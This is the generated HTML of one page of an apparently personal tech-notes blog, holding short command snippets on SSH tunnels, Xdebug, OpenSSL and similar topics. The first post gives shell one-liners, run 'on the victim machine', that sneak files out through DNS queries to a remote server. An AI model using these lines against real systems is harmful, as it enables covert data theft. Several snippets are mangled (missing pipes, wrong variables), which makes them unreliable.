@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://wirelessbox.net/page/17/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/hw-1/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" integrity="sha384-XdYbMnZ/QjLh6iI4ogqCTaIjrFk87ip+ekIjefZch0Y+PvJ8CDYtEs1ipDmPorQ+" crossorigin="anonymous">
+
+  
+<link rel="stylesheet" href="/hw-1/css/styles.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <nav class="navbar navbar-inverse">
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#main-menu-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="main-menu-navbar">
+      <ul class="nav navbar-nav">
+        
+          <li><a class=""
+                 href="/hw-1/index.html">Home</a></li>
+        
+          <li><a class=""
+                 href="/hw-1/archives/">Archives</a></li>
+        
+      </ul>
+
+      <!--
+      <ul class="nav navbar-nav navbar-right">
+        
+          <li><a href="/atom.xml" title="RSS Feed"><i class="fa fa-rss"></i></a></li>
+        
+      </ul>
+      -->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+
+  <div class="container">
+    <div class="blog-header">
+  <h1 class="blog-title">Hexo</h1>
+  
+</div>
+
+    <div class="row">
+        <div class="col-sm-8 blog-main">
+          
+  
+    <article id="post-how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/">How To Send Files Stealthily To A Remote Machine Using \&#34;DNSteal\&#34;</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" class="article-date"><time datetime="2016-12-24T07:09:48.000Z" itemprop="datePublished">2016-12-24</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="On-the-victim-machine-you-simply-send-the-following-command"><a href="#On-the-victim-machine-you-simply-send-the-following-command" class="headerlink" title="On the victim machine, you simply send the following command:"></a>On the victim machine, you simply send the following command:</h3><p>[bash] for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done [/bash] Support for multiple files [bash] for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done [/bash] It also supports gzip compression of the file to allow for faster transfer speeds, this can be achieved using the “-z” switch: [bash] python dnsteal.py 127.0.0.1 -z [/bash] Then on the victim machine send a Gzipped file like so: [bash] for b in $(gzip -c file/to/send.png xxd -p); do dig @server $b.filename.com; done [/bash] or for multiple, gzip compressed files: [bash] for filename in $(ls); do for b in $(gzip -c $filename xxd -p); do dig +short @server %b.$filename.com; done; done [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" data-id="ckhg1bw47002s4hmycdgb2da9" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/12/24/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples/">SSH Tunnel - Local and Remote Port Forwarding Explained With Examples</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/12/24/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples/" class="article-date"><time datetime="2016-12-24T06:39:52.000Z" itemprop="datePublished">2016-12-24</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="local-port-to-remote-port"><a href="#local-port-to-remote-port" class="headerlink" title="local port to remote port"></a>local port to remote port</h3><p>[bash] $ ssh -L 9000:google.com:80 <a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#117;&#115;&#x65;&#x72;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;</a> [/bash] this means forwarding our local port 9000 to imgur.com:80</p>
+<h3 id="remote-port-to-local-port"><a href="#remote-port-to-local-port" class="headerlink" title="remote port to local port"></a>remote port to local port</h3><p>[bash] $ ssh -R 9000:localhost:3000 <a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#x73;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a> [/bash] this means forwarding example.com server port 9000 to local 3000 port</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/12/24/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples/" data-id="ckhg1bw5i007e4hmyhskxc84k" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-xdebug-for-xampp-on-osx" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/12/24/xdebug-for-xampp-on-osx/">Xdebug for XAMPP on OSX</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/12/24/xdebug-for-xampp-on-osx/" class="article-date"><time datetime="2016-12-24T06:28:49.000Z" itemprop="datePublished">2016-12-24</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="install-autoconf"><a href="#install-autoconf" class="headerlink" title="install autoconf"></a>install autoconf</h1><p>[bash] $ brew install autoconf [/bash]</p>
+<h3 id="install-debug"><a href="#install-debug" class="headerlink" title="install debug"></a>install debug</h3><p>[bash] wget <a target="_blank" rel="noopener" href="http://xdebug.org/files/xdebug-2.5.3.tgz">http://xdebug.org/files/xdebug-2.5.3.tgz</a> tar -xvzf xdebug-2.5.3.tgz cd xdebug-2.5.3 phpize ./configure –enable-xdebug –with-php-config=/Applications/XAMPP/xamppfiles/bin/php-config make modules_path=$(find /Applications/XAMPP/xamppfiles/lib/php/extensions -name “no-debug-non-zts*“) echo $modules_path sudo cp modules/xdebug.so $modules_path [/bash] [bash] //Edit /Applications/XAMPP/xamppfiles/etc/php.ini //After zend_extension zend_extension=xdebug.so //add xdebug configure xdebug.remote_enable=1 xdebug.remote_handler=dbgp xdebug.remote_host=localhost xdebug.remote_autostart = 1 xdebug.remote_port=9000 xdebug.show_local_vars=1 xdebug.remote_log=/Applications/XAMPP/logs/xdebug.log //Optional – for development only //Find max_execution_time and set to unlimited: max_execution_time=0 [/bash]</p>
+<h3 id="Restart-Apache-using-XAMPP’s-manager-osx"><a href="#Restart-Apache-using-XAMPP’s-manager-osx" class="headerlink" title="Restart Apache using XAMPP’s manager-osx"></a>Restart Apache using XAMPP’s manager-osx</h3>
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/12/24/xdebug-for-xampp-on-osx/" data-id="ckhg1bw67009m4hmy52ys8g8x" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-how-to-encrypt-a-big-file-using-openssl-and-someones-public-key" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/11/18/how-to-encrypt-a-big-file-using-openssl-and-someones-public-key/">How to encrypt a big file using OpenSSL and someone&#39;s public key</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/11/18/how-to-encrypt-a-big-file-using-openssl-and-someones-public-key/" class="article-date"><time datetime="2016-11-18T02:46:27.000Z" itemprop="datePublished">2016-11-18</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>How to encrypt a big file using OpenSSL and someone’s public key The situation You have a public key for someone, you have a file you want to send them, you want to send it securely. Can you call them, securely chat with them, or send them an encrypted e-mail? If you are set up to chat over OTR with them or to send them an encrypted e-mail, just use that to send your file. It’ll be faster. If you can call them, then call them and agree on a symmetric key. Then just use that key to encrypt the file like this. If you can’t (or don’t want to) do either of those, then you can follow this how-to. Step 0) Get their public key The other person needs to send you their public key in .pem format. If they only have it in rsa format (e.g., they use it for ssh), then have them do: [bash]openssl rsa -in id_rsa -outform pem &gt; id_rsa.pem openssl rsa -in id_rsa -pubout -outform pem &gt; id_rsa.pub.pem[/bash] Have them send you id_rsa.pub.pem Step 1) Generate a 256 bit (32 byte) random key [bash]openssl rand -base64 32 &gt; key.bin[/bash] Step 2) Encrypt the key [bash]openssl rsautl -encrypt -inkey id_rsa.pub.pem -pubin -in key.bin -out key.bin.enc[/bash] Step 3) Actually Encrypt our large file [bash]openssl enc -aes-256-cbc -salt -in SECRET_FILE -out SECRET_FILE.enc -pass file:./key.bin[/bash] Step 4) Send/Decrypt the files Send the .enc files to the other person and have them do: [bash]openssl rsautl -decrypt -inkey id_rsa.pem -in key.bin.enc -out key.bin openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./key.bin [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/11/18/how-to-encrypt-a-big-file-using-openssl-and-someones-public-key/" data-id="ckhg1bw43002c4hmyengx6n22" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-delete-osx-account-on-command" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/11/18/delete-osx-account-on-command/">delete osx account on command</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/11/18/delete-osx-account-on-command/" class="article-date"><time datetime="2016-11-18T02:04:44.000Z" itemprop="datePublished">2016-11-18</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[bash]dscl localhost delete /Local/Default/Users/bobross rm -rf /Users/bobross[/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/11/18/delete-osx-account-on-command/" data-id="ckhg1bw3o00124hmyc92536fk" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-raspberry-pi3-wifi-config" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/11/02/raspberry-pi3-wifi-config/">raspberry pi3  wifi  config</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/11/02/raspberry-pi3-wifi-config/" class="article-date"><time datetime="2016-11-02T11:12:05.000Z" itemprop="datePublished">2016-11-02</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>###change ssh default keys [bash]rm /etc/ssh/ssh_host_* [/bash] ###dpkg-reconfigure openssh-server [bash]service ssh restart [/bash] ###config wifi [bash]vim /etc/network/interfaces auto wlan0 iface wlan0 inet dhcp wpa-ssid “your network name” wpa-psk “the network password” //restart service networking restart [/bash] ###list pci [bash]apt install pciutils lspci [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/11/02/raspberry-pi3-wifi-config/" data-id="ckhg1bw59006c4hmya7kuh703" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ubuntu-max-ulimit" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/10/31/ubuntu-max-ulimit/">ubuntu max ulimit</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/10/31/ubuntu-max-ulimit/" class="article-date"><time datetime="2016-10-31T03:12:00.000Z" itemprop="datePublished">2016-10-31</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[bash]ulimit -a open files (-n) 1024 vim /etc/security/limits.conf //append * hard nofile 40960 * soft nofile 40960 vim /etc/profile ulimit -SHn 40960 [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/10/31/ubuntu-max-ulimit/" data-id="ckhg1bw5s008c4hmy1afx3olm" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-reavealapp-dynamic-load" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/10/24/reavealapp-dynamic-load/">reavealapp dynamic load</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/10/24/reavealapp-dynamic-load/" class="article-date"><time datetime="2016-10-24T06:13:50.000Z" itemprop="datePublished">2016-10-24</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[bash]1, Add Symbolic Breakpoint 2, Enter UIApplicationMain into the Symbol field. 3, Click the Add Action button, and ensure that Action is set to Debugger Command. 4, Copy and paste the following text into the field below: expr (Class)NSClassFromString(@”IBARevealLoader”) == nil ? (void *)dlopen(“/Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib”, 0x2) : ((void*)0) 5, Check Automatically continue after evaluating actions. 6, Right click the newly created breakpoint and select Move Breakpoint To → User. [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/10/24/reavealapp-dynamic-load/" data-id="ckhg1bw5c006o4hmy3igz6cpw" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-alcatraz-install-xcode8" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/10/22/alcatraz-install-xcode8/">Xcode8 install Alcatraz</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/10/22/alcatraz-install-xcode8/" class="article-date"><time datetime="2016-10-22T09:26:38.000Z" itemprop="datePublished">2016-10-22</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[bash]sudo codesign –remove-signature /Applications/Xcode.app/Contents/MacOS/Xcode curl -fsSL <a target="_blank" rel="noopener" href="https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh">https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh</a> sh [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/10/22/alcatraz-install-xcode8/" data-id="ckhg1bw3100004hmyfagm6ipq" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mongodb-example-command" class="article article-type-post" itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hw-1/2016/10/15/mongodb-example-command/">mongodb example command</a>
+    </h1>
+  
+
+
+  </header>
+
+  <div class="article-meta">
+    <div class="article-datetime">
+  <a href="/hw-1/2016/10/15/mongodb-example-command/" class="article-date"><time datetime="2016-10-15T02:21:38.000Z" itemprop="datePublished">2016-10-15</time></a>
+</div>
+
+    
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hw-1/categories/uncategorized/">uncategorized</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[bash]./mongorestore –dir ./dump/radacctinfo –db radacctinfo ./mongodump –host 127.0.0.1 –db local ./mongo mongodb://127.0.0.1 sudo ./mongod –dbpath /data/db show dbs use local show tables db.radacctinfo.find().pretty() [/bash]</p>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://wirelessbox.net/2016/10/15/mongodb-example-command/" data-id="ckhg1bw4u004u4hmyblsmd5dw" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <div id="page-nav">
+    <nav><ul class="pagination"><li><a class="page-prev" rel="prev" href="/hw-1/hw-1/page/16/"><i class="fa fa-chevron-left"></i> Prev</a></li><li><a class="page-number" href="/hw-1/hw-1/">1</a></li><li class="disabled"><span class="page-space">&hellip;</span></li><li><a class="page-number" href="/hw-1/hw-1/page/15/">15</a></li><li><a class="page-number" href="/hw-1/hw-1/page/16/">16</a></li><li class="active"><span class="page-number">17</span></li><li><a class="page-number" href="/hw-1/hw-1/page/18/">18</a></li><li><a class="page-number" href="/hw-1/hw-1/page/19/">19</a></li><li><a class="page-next" rel="next" href="/hw-1/hw-1/page/18/">Next <i class="fa fa-chevron-right"></i></a></li></ul></nav>
+  </div>
+
+
+
+        </div>
+        <div class="col-sm-3 col-sm-offset-1 blog-sidebar">
+          
+  <div class="sidebar-module sidebar-module-inset">
+  <h4>About</h4>
+  <p>Etiam porta <em>sem malesuada magna</em> mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.</p>
+
+</div>
+
+
+  
+  <div class="sidebar-module">
+    <h4>Categories</h4>
+    <ul class="sidebar-module-list"><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/categories/uncategorized/">uncategorized</a><span class="sidebar-module-list-count">186</span></li></ul>
+  </div>
+
+
+
+  
+
+
+  
+
+  
+  <div class="sidebar-module">
+    <h4>Archives</h4>
+    <ul class="sidebar-module-list"><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/11/">November 2020</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/10/">October 2020</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/09/">September 2020</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/08/">August 2020</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/03/">March 2020</a><span class="sidebar-module-list-count">9</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/02/">February 2020</a><span class="sidebar-module-list-count">3</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2020/01/">January 2020</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/12/">December 2019</a><span class="sidebar-module-list-count">10</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/11/">November 2019</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/08/">August 2019</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/07/">July 2019</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/06/">June 2019</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/05/">May 2019</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/04/">April 2019</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/03/">March 2019</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/02/">February 2019</a><span class="sidebar-module-list-count">6</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2019/01/">January 2019</a><span class="sidebar-module-list-count">6</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/12/">December 2018</a><span class="sidebar-module-list-count">7</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/11/">November 2018</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/10/">October 2018</a><span class="sidebar-module-list-count">6</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/09/">September 2018</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/08/">August 2018</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/07/">July 2018</a><span class="sidebar-module-list-count">8</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/06/">June 2018</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/03/">March 2018</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/02/">February 2018</a><span class="sidebar-module-list-count">6</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2018/01/">January 2018</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/12/">December 2017</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/11/">November 2017</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/10/">October 2017</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/09/">September 2017</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/08/">August 2017</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/06/">June 2017</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/05/">May 2017</a><span class="sidebar-module-list-count">8</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/04/">April 2017</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/03/">March 2017</a><span class="sidebar-module-list-count">8</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/02/">February 2017</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2017/01/">January 2017</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/12/">December 2016</a><span class="sidebar-module-list-count">5</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/11/">November 2016</a><span class="sidebar-module-list-count">3</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/10/">October 2016</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/09/">September 2016</a><span class="sidebar-module-list-count">2</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/08/">August 2016</a><span class="sidebar-module-list-count">4</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/07/">July 2016</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/05/">May 2016</a><span class="sidebar-module-list-count">1</span></li><li class="sidebar-module-list-item"><a class="sidebar-module-list-link" href="/hw-1/archives/2016/03/">March 2016</a><span class="sidebar-module-list-count">8</span></li></ul>
+  </div>
+
+
+
+  
+  <div class="sidebar-module">
+    <h4>Recents</h4>
+    <ul class="sidebar-module-list">
+      
+        <li>
+          <a href="/hw-1/2020/11/11/%E6%B2%BB%E6%84%88%E7%B3%BB%E8%AF%BE%E7%A8%8B-%E4%B8%83%E5%A4%A7%E4%BD%93%E7%B3%BB%E5%85%AB%E5%A4%A7%E5%85%85%E8%8A%82%E5%AE%8C%E6%95%B4%E7%89%88/">治愈系课程-七大体系八大充节完整版 - 免费下载</a>
+        </li>
+      
+        <li>
+          <a href="/hw-1/2020/11/06/%E8%BD%BB%E6%9D%BE%E8%A7%A3%E5%86%B3tensorflow%E6%8A%A5%E9%94%99illegal-instruction-core-dumped/">轻松解决Tensorflow报错illegal instruction (core dumped)</a>
+        </li>
+      
+        <li>
+          <a href="/hw-1/2020/11/06/ios-build-failed-at-compile-time-with-issue-failed-to-find-a-suitable-device-for-the-type-simdevicetype/">iOS Build Failed at compile time with issue “failed to find a suitable device for the type SimDeviceType”</a>
+        </li>
+      
+        <li>
